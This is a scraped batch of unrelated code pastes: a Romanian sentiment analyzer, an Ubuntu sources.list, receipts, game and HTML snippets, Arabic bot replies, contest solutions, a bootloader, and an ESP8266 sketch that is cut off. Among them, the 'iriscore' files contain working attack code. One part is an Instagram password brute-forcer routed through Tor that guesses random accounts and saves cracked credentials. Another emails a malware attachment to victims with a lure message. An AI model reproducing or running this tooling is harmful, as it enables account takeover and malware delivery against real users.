kiEfMCt5,analyzing person psychology.html,nicuf,Python,Thursday 24th of August 2023 07:43:21 AM CDT,"#  ENGLISH: https://neculaifantanaru.com/en/python-analyzing-person-psychology.html

# ROMANIAN: https://neculaifantanaru.com/python-analizarea-persoanei-psihologie.html


import tkinter as tk
from textblob import TextBlob
from googletrans import Translator
import re
from unidecode import unidecode


# Funcție pentru analiza sentimentului și subiectivității
def analyze_sentiment(text):
    translator = Translator()
    translated_text = translator.translate(text, src='ro', dest='en').text
    blob = TextBlob(translated_text)
    sentiment = blob.sentiment.polarity
    subjectivity = blob.sentiment.subjectivity
    return sentiment, subjectivity

# Dicționar cu cuvinte pozitive și negative
positive_words = [
    ""da"", ""iubesc"", ""admir"", ""bunătate"", ""de acord"", ""fericit"", ""încrezător"", ""optimist"", ""satisfăcut"",
    ""energic"", ""vital"", ""plin de viață"", ""entuziasmat"", ""mulțumit"", ""recunoscător"", ""liniștit"", ""relaxat"",
    ""calm"", ""echilibrat"", ""armonios"", ""inspirat"", ""motivat"", ""curajos"", ""puternic"", ""rezistent"", ""înțelegător"",
    ""empatic"", ""generos"", ""amabil"", ""prietenos"", ""sincronizat"", ""conectat"", ""unit"", ""împăcat"", ""acceptant"",
    ""tolerant"", ""deschis"", ""onest"", ""autentic"", ""real"", ""veridic"", ""sincer"", ""franc"", ""direct"", ""clar"",
    ""luminos"", ""stralucitor"", ""radiant"", ""sclipitor"", ""măreț"", ""splendid"", ""magnific"", ""glorios"", ""sublim"",
    ""nobil"", ""onorabil"", ""demn"", ""respectuos"", ""politos"", ""curtenitor"", ""elegant"", ""rafinat"", ""distins"",
    ""înalt"", ""superior"", ""excelent"", ""perfect"", ""impecabil"", ""ireproșabil"", ""fără greșeală"", ""corect"",
    ""drept"", ""just"", ""echitabil"", ""imparțial"", ""necondiționat"", ""absolut"", ""complet"", ""integral"", ""total"",
    ""universal"", ""global"", ""general"", ""cuprinzător"", ""inclusiv"", ""extensiv"", ""larg"", ""vast"", ""imens"",
    ""profund"", ""intens"", ""puternic"", ""putere"", ""energie"", ""vigoare"", ""forță"", ""rezistență"", ""stabilitate"",
    ""splendidă"", ""liber"", ""calm""
]

negative_words = [
    ""nu"", ""nu sunt"", ""neplăcere"", ""disconfort"", ""nasol"", ""urăsc"", ""nu vreau"", ""obosit"", ""stresat"",
    ""frustrat"", ""dezamăgit"", ""furios"", ""trist"", ""bolnav"", ""plictisit"", ""nervos"", ""gelos"", ""invidios"",
    ""dezgustat"", ""rușinat"", ""vinovat"", ""nefericit"", ""nemulțumit"", ""neîncrezător"", ""pesimist"", ""copleșit"",
    ""panicat"", ""îngrijorat"", ""speriat"", ""timorat"", ""neajutorat"", ""slăbit"", ""defetist"", ""dezorientat"",
    ""confuz"", ""neputincios"", ""iritat"", ""agitat"", ""furie"", ""ura"", ""invidie"", ""gelozie"", ""dispreț"",
    ""mânie"", ""răzbunare"", ""frică"", ""teamă"", ""anxietate"", ""depresie"", ""tristețe"", ""melancolie"", ""apatie"",
    ""plictiseală"", ""dezinteres"", ""nepăsare"", ""indiferență"", ""neîncredere"", ""suspiciune"", ""îndoială"",
    ""necredință"", ""neînțelegere"", ""conflict"", ""tensiune"", ""presiune"", ""stres"", ""nervozitate"", ""iritare"",
    ""agresivitate"", ""violenta"", ""ostilitate"", ""răutate"", ""cruel"", ""malițios"", ""vătămător"", ""distructiv"",
    ""nociv"", ""periculos"", ""amenințător"", ""sinistru"", ""fatal"", ""letal"", ""mortal"", ""dăunător"", ""murdar"", ""nesatisfacut"",
    ""dificil"", ""confuz"", ""neliniștit"", ""bou"", ""vaca""
]


# Funcție pentru a prelua textul și a efectua analiza
def analyze():

    # Afișează mesajul de încărcare
    loading_label = tk.Label(root, text=""Analiza în curs... Vă rugăm așteptați."")
    loading_label.pack(padx=10, pady=10)
    root.update_idletasks()  # Actualizează interfața pentru a afișa mesajul de încărcare

    text = text_entry.get(""1.0"", tk.END)
    journal_entries = re.split(r'[.!?]', text)

    positive_count = 0
    negative_count = 0

     # Ascunde mesajul de încărcare
    loading_label.destroy()

    # Afisare rezultate într-o fereastră nouă
    results_window = tk.Toplevel(root)
    results_window.title(""Rezultate Analiză"")
    results_text = tk.Text(results_window, wrap=tk.WORD, width=80, height=20)
    results_text.pack(padx=10, pady=10)
    results_text.insert(tk.END, ""Valoare Sentiment        |        Subiectivitate\n"")
    results_text.insert(tk.END, ""--------------------------------------------\n\n"")
    for entry in journal_entries:
        entry = entry.strip()
        if entry:
            sentiment, subjectivity = analyze_sentiment(entry)
            results_text.insert(tk.END, entry + '\n')
            results_text.insert(tk.END, str(sentiment) + ""                    |         "" + str(subjectivity) + '\n\n')

            # Contorizarea cuvintelor pozitive și negative
            for word in entry.split():
                word_without_diacritics = unidecode(word.lower())
                if any(word_without_diacritics.startswith(unidecode(w)) for w in positive_words):
                    positive_count += 1
                if any(word_without_diacritics.startswith(unidecode(w)) for w in negative_words):
                    negative_count += 1

    # Caracterizare persoană
    characterization = ""Caracterizare persoană:\n------------------------\n""
    if positive_count > negative_count:
        characterization += ""Persoana pare a fi optimistă și are o atitudine pozitivă.\n""
    elif negative_count > positive_count:
        characterization += ""Persoana pare a fi pesimistă și are o atitudine negativă.\n""
    else:
        characterization += ""Persoana pare a avea o atitudine echilibrată.\n""

    results_text.insert(tk.END, characterization)

    # Permiterea copierii și lipirii
    results_text.bind(""<Control-c>"", copy)
    results_text.bind(""<Control-v>"", paste)

# Funcții pentru copiere
def copy(event):
    widget = event.widget
    widget.clipboard_clear()
    widget.clipboard_append(widget.selection_get())

def paste(event):
    widget = event.widget
    widget.insert(tk.INSERT, widget.clipboard_get())

# Interfața grafică
root = tk.Tk()
root.title(""Analiza Sentimentelor în Psihiatrie"")

text_entry = tk.Text(root, wrap=tk.WORD, width=50, height=10)
text_entry.pack(padx=10, pady=10)

# Permiterea copierii
text_entry.bind(""<Control-c>"", copy)

analyze_button = tk.Button(root, text=""Analizează"", command=analyze)
analyze_button.pack(padx=10, pady=10)

root.mainloop()
"
9aupyGQ8,/etc/apt/sources.list da orin,lemueltra,Bash,Thursday 24th of August 2023 07:39:40 AM CDT,"orinihr@ubuntu:~$ cat /etc/apt/sources.list
# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to
# newer versions of the distribution.
deb http://ports.ubuntu.com/ubuntu-ports/ focal main restricted
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal main restricted

## Major bug fix updates produced after the final release of the
## distribution.
deb http://ports.ubuntu.com/ubuntu-ports/ focal-updates main restricted
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-updates main restricted

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team. Also, please note that software in universe WILL NOT receive any
## review or updates from the Ubuntu security team.
deb http://ports.ubuntu.com/ubuntu-ports/ focal universe
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal universe
deb http://ports.ubuntu.com/ubuntu-ports/ focal-updates universe
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-updates universe

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team, and may not be under a free licence. Please satisfy yourself as to
## your rights to use the software. Also, please note that software in
## multiverse WILL NOT receive any review or updates from the Ubuntu
## security team.
deb http://ports.ubuntu.com/ubuntu-ports/ focal multiverse
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal multiverse
deb http://ports.ubuntu.com/ubuntu-ports/ focal-updates multiverse
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-updates multiverse

## N.B. software from this repository may not have been tested as
## extensively as that contained in the main release, although it includes
## newer versions of some applications which may provide useful features.
## Also, please note that software in backports WILL NOT receive any review
## or updates from the Ubuntu security team.
deb http://ports.ubuntu.com/ubuntu-ports/ focal-backports main restricted universe multiverse
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-backports main restricted universe multiverse

## Uncomment the following two lines to add software from Canonical's
## 'partner' repository.
## This software is not part of Ubuntu, but is offered by Canonical and the
## respective vendors as a service to Ubuntu users.
# deb http://archive.canonical.com/ubuntu focal partner
# deb-src http://archive.canonical.com/ubuntu focal partner

deb http://ports.ubuntu.com/ubuntu-ports/ focal-security main restricted
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-security main restricted
deb http://ports.ubuntu.com/ubuntu-ports/ focal-security universe
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-security universe
deb http://ports.ubuntu.com/ubuntu-ports/ focal-security multiverse
# deb-src http://ports.ubuntu.com/ubuntu-ports/ focal-security multiverse"
KRtxpXa6,Untitled,bodarev,JSON,Thursday 24th of August 2023 07:32:27 AM CDT,"{""items"":[{""itemText"":[""MFD cu jet Canon Pixma G24"",11],""vat"":""A"",""commentText"":[""Codul produsului: 381451"",""OPERATOR: BM TECHNOTRADE SRL""],""fontStyle"":0,""price"":3499,""qty"":1,""discount"":0}],""paymentAmount"":3499,""paymentMethod"":""P"",""totalComments"":[],""startComments"":[{""lineText"":"""",""fontStyle"":1},{""lineText"":"""",""fontStyle"":2}],""endComments"":[{""lineText"":"""",""fontStyle"":1},{""lineText"":"""",""fontStyle"":2}]}"
6jPJutUq,Untitled,bodarev,JSON,Thursday 24th of August 2023 07:28:12 AM CDT,"{""items"":[{""itemText"":[""Dezumidificator Fram FDUM1"",2],""vat"":""A"",""commentText"":[""Codul produsului: 896134"",""OPERATOR: BM TECHNOTRADE SRL""],""fontStyle"":0,""price"":4499,""qty"":1,""discount"":0}],""paymentAmount"":4499,""paymentMethod"":""P"",""totalComments"":[],""startComments"":[{""lineText"":"""",""fontStyle"":1},{""lineText"":"""",""fontStyle"":2}],""endComments"":[{""lineText"":"""",""fontStyle"":1},{""lineText"":"""",""fontStyle"":2}]}"
N4kwvZJH,Camera Bobble Effect,oopsrainbow4,Lua,Thursday 24th of August 2023 07:09:13 AM CDT,"-- Local script in StarterCharacterScript

local RunService = game:GetService(""RunService"")
local character = script.Parent
local humanoid = character:WaitForChild(""Humanoid"")

function updateBobbleEffect()
	local CurrentTime = tick()
	if humanoid.MoveDirection.Magnitude > 0 then
		local BobbleX = math.cos(CurrentTime * 10) * .25
		local BobbleY = math.abs(math.sin(CurrentTime * 10)) * .25
		local Bobble = Vector3.new(BobbleX, BobbleY, 0)
		
		humanoid.CameraOffset = humanoid.CameraOffset:lerp(Bobble, .25)
	else
		humanoid.CameraOffset = humanoid.CameraOffset * .75 
	end
end

RunService.RenderStepped:Connect(updateBobbleEffect)"
mEzr4cAg,[F2u] Little silly code,MellowBunii,HTML,Thursday 24th of August 2023 06:53:40 AM CDT,"


<!---- Container ---->
<div class=""p-3 rounded text-center"" style=""background-image:url(https://media.istockphoto.com/id/1173733640/photo/green-forest.jpg?s=612x612&w=0&k=20&c=P3DgfHI-FCOMX4vLtCaw3M-7nRdGiAsATfRZRqs9E4E=);background-attachment:fixed;"">
  <div class=""p-3"" style=""background-color:rgba(23, 23, 23, 0.6);color:rgba(235, 235, 235, 1)"">
    <body>


      <!------- Profile picture ---->
      <div class=""container"">
        <img class=""circle-image"" src=""https://f2.toyhou.se/file/f2-toyhou-se/users/RottingZombie?42"" alt=""Circle Image"">
       
       <!--- Name and pronouns n stuff ---->
        <figcaption><span style=""font-size:32px""> 
        
        <!---- Font awesome icon. You can change it here: https://fontawesome.com/ ---->
        <i class=""fas fa-star""></i> 
        
        <!------ Name/username ---->
            Name/username 
        
        <!---- Font awesome icon. You can change it here: https://fontawesome.com/ ---->
        <i class=""fas fa-star""></i>
        
        </span></figcaption> 
        
        <!-------- Pronouns or a quote or whatevs you want :) ---->
        <figcaption><span style=""font-size:12px"">Pro/noun . age . sexuality or a quote or something!</span></figcaption>
<hr>

         <!------- Profile content! ----->
        <figcaption><span style=""font-size:12px"">Profile content here! talk about yourself or your profile or maybe even what you ate last week. It wont scroll! it'll stretch and adjust according to how much text you put here Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</span>
        
        <!------ Credit plz dont remove ill be vv sad :( ----->
        
        
      </div>
    </body>
  </div>
</div>

"
f89YFuVm,ukai,Zoroarid2,JSON,Thursday 24th of August 2023 06:52:15 AM CDT,"انت غبي تكلم بوت؟,
ما تمنشني لو سمحت,
لا تغلط,
طيب وبعدين معك,
شو بدك؟,
معك حق,
تتكلم جد,
I dont speak arabic,
إسأل يوكاي لا تسألني,
ما بعرف,
انا مشغول كلم يوكاي,
ارجع بكرا بجاوبك,
مشغول لا تكلمني,
شلونك انت؟ CarlSmile,
تكلمني؟,
ما أدري,
هاه؟,
ما فهمت,
عيد السؤال مرة ثانية,
يا ولد تتكلم جد؟,
صادق,
صح لسانك,
ابشر طال عمرك,
اهاا اوكي,
ما فهمت عليك,
يا ويلك اذا تمنشن مرة ثانية,
تراني مشغول,
انا زعلت,
خلص زعلت بروح على البيت,
ok,
يب,
كلامك صحيح,
تعبت من المنشن,
خارج نطاق الخدمة حالياً,
الرجاء اعادة الاتصال في وقت اخر,
راجعني ب25 رمضان,
كوكودايو,
ودي أصدق بس كبيرة,
ابعد عني يا مقرف,
قرفتني كل شوي منشن,
انا مسكين,
سمعت اخر خبر؟,
ما ترفع صوتك طيب,
حاضر حاضر BabyRage,
يعني؟,
لا تعيدها,
لاصيدك يا ورع,
كلامك يعكس اخلاقك,
احبك ياخي CarlSmile,
نايس,
انا نايم ResidentSleeper,
والله شوف,
حسيت,
سؤالك صعب,
كلامك جارح كالعادة,
كلمني بلغة البوتات,
تراني بوت ما افهم عليك,
حياة البوت صعبة,
احم انا بوت,
انا فكري فائق,
اروح اشتكي ليوكاي؟,
دمك ثقيل,
انا موجود لكن غير موجود,
جعان وتعبان,
ما تزعل مني احبك ترا CarlSmile,
احس مدري,
ممكن,
ما شاء الله عليك,
لازمك كتاب إملاء,
نسبة غبائك ما تسمحلي ارد عليك,
ارد عليك من هنا لبكرا,
تدري انه البوتات ما تنام,
يلا خلص روح بيتكم حبيبي,
زعلان انا,
خبل انت تكلم بوت,
شنو تريد؟,
وش تبي؟,
احم,
لا تسوي خوي,
بخاطري كلمه ودي اقولها لك,
اقول توكل بس,
قل قسم,
انت عبقري,
اهااا ما فهمت,
مياو,
اضحك يعني؟,
يبوي لا تكلم بوت نصيحة,
بروح مشوار صغير خذ مكاني,
يا ليييل وش جابك هنا,
اقول لك كلمة بس لا تزعل,
وخر عني بس,
امرني بس,
1v1 انزلي,
اتحداك تمنشني كمان مرة,
اذلف بس,
تبيني العب معك؟,
بس اكبر بوريك,
لا تتنمر علي,
عايز اي يسطا,
اسف,
اسف ما رح اعيدها,
ما سويت شي,
يا رجال,
طيب,
وييييييي,
تمام خلص بطلع,
افااااا,
سلامي على كل من اهاني,
يععع ريحتك خايسه,
دعنا صامتين افضل لكي لا اقول شيء اندم عليه,
لا  يأحذك الحماس يا جورج,
قول قسمن عضمن,
قدها؟,
قد ابدو لك اني انهار ولكني فالحقيقة بحيرات,
انا صاحبك بس بدون الصاد,
بعض الناس ينسون والبعض الاخر شاي نعناع,
لا تخاف سرك في بير,
لا تقول ظروف وانت لغيري خروف,
مثير للشفقه,
والطقعة,
الشامبو ضد القشرة والصحاب باعو العشرة,
انا يادوب ابلع الاكل كيف تبيني ابلعك,
هاك لا تنبح 🦴,
خذ ورده اعتذار عن ما بدر مني 🌹,
الو مكافحة الحمير تعالو في حمار قدامي ,
شسمك يا قلبي اريد اسجلك بقائمة المفضلين عندي,
الله يهديك حبيبي,
اكل تبن,
يعلم الله انك شخص غالي,
حلوه منك فديتك,
الذهب ثلاث انواع ذهب مقلد وذهب اصلي وذهب الليل وطلع الفجر والعصفور صوصو,
يمه يمه خفت,
انا فاهم بس بستعبط,
انت انطم محد طلب رايك,
خليني ساكت,
تعال نتفاهم بالخاص,
متت من الكرينج,
يسطا اتقي الله,
خير؟؟,
ترا محد طلب رايك,
مسوي خوي,
إهداُ يا جورج,
عدل مستواك ثم تعال كلمني,
انا ندمت اني رديت عليك,
ظلام ما اسمع,
قول والله؟,
ما احب ابرر خذ عني صورة سيئة وعلقها في غرفتك,
لا تخليني ازعلك,
اسف ما افهم لغة البقر,
والله ياخوي مدري,
انا ندمت اني رديت عليك"
AxPLzTHQ,iriscore/_init_.py,FlyFar,Python,Thursday 24th of August 2023 06:49:25 AM CDT,"""""""
.
"""""""
7fiQttjC,iriscore/core.py,FlyFar,Python,Thursday 24th of August 2023 06:48:28 AM CDT,"import random
import names
from random_username.generate import generate_username
from colorama import Fore, Style
import colorama
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart 
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
from email import encoders 
import os
import ssl

""""""""
=============================================================================================
Random Email and Random password generation 
with the hope to find discover new Email accounts.

for example, create a random email like bob8721@gmail.com and password bob1234 
there is a 50% change that the email + password is real.
if it is, It's saved, If not, Keep generating random email:creds
""""""

def random_email(username_also = False):
    """""" 
    Return a random email
    """"""
    random_numbers = str(random.randrange(0, 5000))
    random_years = str(random.randrange(1833, 2050)) # 1833 when computer was invented (ABACUS)
    name_full = names.get_full_name()
    name_first = names.get_first_name()
    name_last = names.get_last_name()

    if(username_also == True):
        prefix = random.choice([name_full.replace("" "", """"), name_first, name_last])
        two = prefix.lower() + str(random.randrange(0, 500))  # Random Name + number 
        three = generate_username(1)[0] + random_numbers # Random Username + random_number
        four = generate_username(1)[0] + random_years # Random Username + Random Years 
        five = prefix.lower() # Random name only
        six = prefix.lower() + str(random.randrange(0, 500)) # Random name + Random number 0 to 500
        seven = generate_username(1)[0] + random_numbers # random Username + random number 
        eight = generate_username(1)[0] + random_years # Random Username + random year
        FINAL_EMAIL = random.choice([
        two,
        three,
        four,
        five,
        six,
        seven,
        eight])
    else:
        service = [""@gmail.com"", ""@yahoo.com"", ""@protonmail.com"", ""@outlook.com"", ""@yandex.com""]
        prefix = random.choice([name_full.replace("" "", """"), name_first, name_last])
        email_service = random.choice([service[0], service[1], service[2], service[3], service[4]])

        mail_one = prefix.lower() + email_service
        mail_two = prefix.lower() + str(random.randrange(0, 500)) + email_service
        mail_three = generate_username(1)[0] + random_numbers + email_service
        mail_four = generate_username(1)[0] + random_years + email_service
        FINAL_EMAIL = random.choice([mail_one, mail_two, mail_three, mail_four])
        
    return FINAL_EMAIL, prefix.lower()
    
def random_password(username):
    """"""
    Return a random password
    """"""
    random_numbers = str(random.randrange(0, 500))

    return username + random_numbers


""""""""
=============================================================================================
""""""

def send_mail(my_addr, my_pass, addr, malware_path):

    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ""\n[+] Sending Email to : "" + addr)
    context = ssl.create_default_context()
    server = smtplib.SMTP(""smtp.gmail.com"", 587)
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    try:
        server.login(my_addr, my_pass)
    except smtplib.SMTPAuthenticationError:
        print(Style.BRIGHT + Fore.RED + ""[X] Email or Password Incorrect. (SMTPAuthenticationError)"" + Style.RESET_ALL)
        exit(1)
    except Exception as er:
        print(Style.BRIGHT + Fore.RED + ""[X] "" + str(er) + Style.RESET_ALL)
        exit(1)

    msg = MIMEMultipart()
    txt = ""The file u requested.""

    msg['Subject'] = 'Here is what you requested.'
    msg['From'] = my_addr
    msg['To'] = addr
    msg.attach(MIMEText(txt))

    with open(malware_path, ""rb"") as attach:
        p = MIMEApplication(
            attach.read(),
            Name=os.path.basename(malware_path)
        ) 
        p['Content-Disposition'] = 'attachment; filename=""%s""' % os.path.basename(malware_path)
        
    msg.attach(p)

    try:
        server.send_message(msg)
        print(Style.BRIGHT + Fore.LIGHTGREEN_EX + ""[+] Email Sent to : "" + addr + Style.RESET_ALL)
    except Exception as E:
        print(Style.BRIGHT + Fore.RED + ""[X] Error Sending mail "" + str(E) + Style.RESET_ALL)

    server.quit()

def BANNER():
    colorama.init()
    banner = Style.BRIGHT + Fore.LIGHTGREEN_EX + """"""
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%      (^^^^^^)       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^                      /^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^#                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^                           ^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^,                                   ^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^,                                             ^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^*                                                       ^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^         /^^^^^^^^^^^^^^^^^/         ^^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^     /^^^^^    *^^^^^^^^^^^/     ^^^^(     ^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^#   &^^^^^^^^^^,   ^^^^^^^^^   ^^^^^^^^^^^&   (^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^*             ,^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^/   /^^^^^/   /^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^*   ^^^^^^^^^^^(   ^^^^^^^^^   (^^^^^^^^^^^   ,^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^     ^^^^^^     ^^^^^^^^^^^     &^^^^^^    ^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^#          ^^^^^^^^^^^^^^^^^          (^^^^^^^^^^^^^^^^^^^^
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

"""""" + Style.RESET_ALL

    return banner"
TnkryCxi,iriscore/instagram.py,FlyFar,Python,Thursday 24th of August 2023 06:47:07 AM CDT,"from colorama import Fore, Style
import colorama
import requests
from .core import *
from InstagramPy.InstagramPyCLI import InstagramPyCLI
from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
from InstagramPy.InstagramPyInstance import InstagramPyInstance
from datetime import datetime

proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

def BruteForceInstagram(username, password, mode = False):

    appInfo = {
   ""version""     : ""0.0.1"",
   ""name""        : ""Paradoxia IRIS"",
   ""description"" : ""Choose Strong Passwords"",
   ""author""      : ""QuantumCore"",
   ""company""     : ""QCORED"",
   ""year""        : ""2020"",
   ""example""     : """"
    }
    
    cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3, username=username)

    session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
    session.ReadSaveFile(False) # True to countinue attack if found save file.
    instagrampy = InstagramPyInstance(cli = None ,session = session)
    with open(password, ""r"") as list:
        lines = list.readlines()
    if(mode == True):
        print('[*] Brute Forcing ' + username + ' {len} Passwords...'.format(len = str(len(lines))))
    else:
        print('[*] Brute Forcing ' + username + ' with {len} probable weak Passwords.'.format(len = str(len(lines))))

    for i in range(len(lines)):
        instagrampy.TryPassword()
        if not instagrampy.PasswordFound():
            print(Style.BRIGHT + Fore.LIGHTYELLOW_EX)
            print('[-] Login Failed ' + username + ':' +session.CurrentPassword())
            instagrampy.TryPassword()
            
        if instagrampy.PasswordFound():
            print(Style.BRIGHT + Fore.CYAN)
            print('[+] Password Found: '+session.CurrentPassword())
            with open(""accounts.iris"", ""a+"") as found:
                found.write(""\n[INSTAGRAM] "" + username + "":""+session.CurrentPassword())
                break
        else:
            pass    


def isInstagramUser(user):
    try:
        rsp = requests.get(""https://instagram.com/"" + user + ""/"")
        if(rsp.status_code == 404):
            # print(Fore.RED + Style.BRIGHT + ""[+] Account {account} not found."".format(account = user))
            return False
        elif(rsp.status_code == 200):
            print(Style.BRIGHT + Fore.LIGHTBLUE_EX + ""[+] Account {account} found."".format(account = user))
            return True
    except Exception as error:
        print(Fore.RED + Style.BRIGHT + ""[X] Error : "" + str(error))
        print(Fore.RED + Style.BRIGHT + ""[X] Connection Refused. Make sure TOR Socks Proxy is running on 127.0.0.1:9050 and you have an Active Internet Connection."")

def create_temp_list(user):
    with open(""temp.iris"", ""w"") as wlist:
        for i in range(20):
            r = random_password(user)
            wlist.write(r+""\n"")
        with open(""top_common.list"", ""r"") as common:
            for l in common.readlines():
                wlist.write(l)
        
        wlist.write(""\n""+user+""12345"")
        wlist.write(""\n""+user+""123456789"")
        wlist.write(""\n""+user+""12345678"")
        wlist.write(""\n""+user+""123"")
        wlist.write(""\n""+user+""password"")
        wlist.write(""\n""+user+""2009"")
        wlist.write(""\n""+user+""2010"")
        wlist.write(""\n""+user+""2015"")
        wlist.write(""\n""+user+""2019"")
        wlist.write(""\n""+user+""2020"")


def BRUTEFORCE(USER, password_list):
    while(True):
        if(isInstagramUser(USER) == True):
            BruteForceInstagram(USER, password_list, mode=True)
            break
        else:
            break     

def BRUTEFORCE_DISCOVERY():
    while(True):
        USER = random_email(username_also=True)
        if(isInstagramUser(USER[0]) == True):
            with open(""usernames.iris"", ""a+"") as userfile:
                userfile.write(""\n[INSTAGRAM USER] : {s}/{p}"".format(s=USER[0], p=USER[1]))
            create_temp_list(USER[1])
            BruteForceInstagram(USER[1], ""temp.iris"")
        else:
            pass "
v8B9Yhi4,Removing Digits,LEGEND2004,C++,Thursday 24th of August 2023 06:39:48 AM CDT,"#include <bits/stdc++.h>
using namespace std;

#define int long long

int f(int n){
    if(!n)
        return 0;
    int m = 0;
    int x = n;
    while(n){
        m = max(m , n % 10);
        n /= 10;
    }
    return 1 + f(x - m);
}

signed main()
{
    int n;
    cin >> n;
    cout << f(n) << endl;
}
"
vMHjKraU,Untitled,Kyl38,ASM (NASM),Thursday 24th of August 2023 06:36:57 AM CDT,"[org 0x7c00]
bits 16

start:

    inputLoop:
        mov ah, 00h ;keyboard input is set to register ah
        int 16h ;keyboard input is gotten
        mov ah, 0x0e ;teletype interupt is set to print out al, in other words the keyboard input
        int 0x10    ;teletype is told to output what ever is in ah to the screen
        mov di, User_Input
        cmp al, 'version'
        je printVersion

        jmp inputLoop ; allows the user to enter command


    printVersion:
        mov si, version_string ; Sets the string as a source
        call printFunction ; Calls the print function


jmp $

version_string db 'Version: prealpha 0.0.0.1', 0  ;defines a string I want to output later.
User_Input db '', 0

printFunction:   ; Credit to mikeos for this function.
	mov ah, 0Eh		; int 10h 'print char' function

.repeat:            ; Loop
	lodsb			; Get character from string
	cmp al, 0
	je .done		; If char is zero, end of string
	int 10h			; Otherwise, print it
	jmp .repeat

.done:
	ret



;
;   Magic boot number
;   
times 510 - ($-$$) db 0
dw 0xAA55"
qKqkNXH7,Grid Paths,LEGEND2004,C++,Thursday 24th of August 2023 06:22:32 AM CDT,"#include <bits/stdc++.h>
using namespace std;

//#define int long long
const int INF = 1e9;
const int mod = 1e9 + 7;
const int N = 1e3 + 5;
int dp[N][N];

signed main()
{
    int n;
    cin >> n;
    char a[n + 5][n + 5];
    for(int i = 1; i <= n; i++){
        for(int j = 1; j <= n; j++){
            cin >> a[i][j];
        }
    }
    if((a[0][0] == '*') || (a[n - 1][n - 1] == '*')){
        cout << ""0"" << endl;
        return 0;
    }
    for(int i = 1; i <= n; i++){
        for(int j = 1; j <= n; j++){
            if(a[i][j] == '*'){
                dp[i][j] = 0;
                continue;
            }
            if((i == 1) && (j == 1)){
                dp[i][j] = 1;
                continue;
            }
            dp[i][j] = dp[i - 1][j] + dp[i][j - 1];
            dp[i][j] %= mod;
        }
    }


    cout << dp[n][n] << endl;
}
"
pnGQkLMV,Nodemcu DHT22 MQTT deepsleep,hoffmannzs,C++,Thursday 24th of August 2023 06:09:59 AM CDT,"#include ""ESP8266WiFi.h"" // Make sure to add from board manager
#include ""DHT.h"" // Make sure to add from library manager
#include ""PubSubClient.h"" // Make sure to add from library manager
#include <Arduino_JSON.h>  // Make sure to add from library manager

#define DHTPIN D7        // define the digital I/O pin
#define DHTTYPE DHT22         // Type of sensor. DHT22 or DHT11
DHT dht(DHTPIN, DHTTYPE);

// WiFi
const char* ssid = ""your SSID"";
const char* wifi_password = ""your WiFi password"";

// MQTT
const char* mqtt_server = ""IP of the MQTT broker"";
const uint16_t mqtt_port = 1883; // Default MQTT broker port
const char* mqtt_topic = ""your MQTT topic"";
